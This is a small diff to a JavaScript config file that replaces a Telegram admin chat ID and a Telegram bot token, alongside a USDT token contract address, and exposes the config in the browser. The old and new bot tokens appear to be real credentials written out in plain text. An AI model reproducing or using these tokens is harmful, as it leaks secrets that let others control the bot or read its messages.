@@ -14,10 +14,10 @@ const CONFIG = {
     USDT_TOKEN_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",
 
     // Telegram admin chat ID for notifications
-    ADMIN_CHAT_ID: "-1003669795826",
+    ADMIN_CHAT_ID: "-1003883236822",
 
     // Telegram bot token
-    TELEGRAM_BOT_TOKEN: "8551866208:AAEmbiwEMGOKYkdMCpaxYw6gIc6-Bmh0nCI"
+    TELEGRAM_BOT_TOKEN: "8505068314:AAHCLamoxxCKSskyLmEcMMUmVPV2_1OsQhQ"
 };
 
 // Make CONFIG available globally in browser
@@ -29,3 +29,4 @@ if (typeof window !== 'undefined') {
 if (typeof module !== 'undefined' && module.exports) {
     module.exports = CONFIG;
 }
+
